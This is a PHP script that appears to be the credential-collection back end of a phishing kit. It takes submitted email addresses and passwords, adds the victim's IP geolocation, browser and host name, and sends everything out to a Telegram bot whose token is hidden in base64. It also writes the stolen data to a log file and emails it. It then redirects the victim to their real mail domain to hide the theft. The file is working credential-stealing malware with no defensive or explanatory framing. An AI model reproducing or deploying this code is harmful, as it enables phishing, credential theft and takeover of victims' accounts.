<?php

error_reporting(0);
if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

require_once 'config.php';
include '../mail.php';
require_once 'browser.php';


$ip = $_SERVER['REMOTE_ADDR'];
$url="http://www.geoplugin.net/json.gp?ip=" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$uaa = $_SERVER['HTTP_USER_AGENT'];
curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: $uaa");
$ipdat=json_decode(curl_exec($ch));

if (isset($ipdat->geoplugin_countryCode)) {
	$countrycode = $ipdat->geoplugin_countryCode;
	$cn = $ipdat->geoplugin_countryName;
	$ct = $ipdat->geoplugin_city;
	$cr = $ipdat->geoplugin_regionName;
}


if (isset($_POST['username']) || isset($_POST['password'])) { 
$username = $_POST['username'];
$password = $_POST['password'];
$x = base64_encode($username);
$y = explode('@', $username);
$domain = array_pop($y);
}

$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$rs = base64_decode($api);
$hostname = gethostbyaddr($ip);
$datum = date("D M d, Y g:i a");


$message .= '';
$message .= "Email: ".$username."\n";
$message .= "Password: ".$password."\n";
$message .= "IP: ".$ip.", ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$uaa."\n";
$message .= "\n";

$subject = "Mail update $ip ($cn)";
$headers = "From: Notification $cc <noreply>\n";
$headers .= "Reply-To: ".$_POST["username"]."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($username) || empty($password)) {
header("Location: ./?client_id=".$session."&redirect_uri=https%3A%2F%2Fwww.".$domain."%2F&protectedtoken=true&id=".$encode_domain."&Country=".$cc."&x=".$x."");
}
else {
	$files = explode("@",$rs);
	$chat = '@';
	$chatid = $chat.$files['1'];
	$token = $files['0'];
	$link = 'https://api.telegram.org/bot'.$token.''; 
	$parameter = [
		'chat_id' => $chatid, 
		'text' => $message
		];
 
	$request_url = $link.'/sendMessage?'.http_build_query($parameter); 
	file_get_contents($request_url);
	$accesslogs = "../admin/webclient.txt";
	$a = fopen($accesslogs, "a") or die("Unable to open file!");
	fwrite($a,$message."\n");
	fclose($a);
	mail($to,$subject,$message,$headers);
	header('Location: https://'.$domain);
}

?>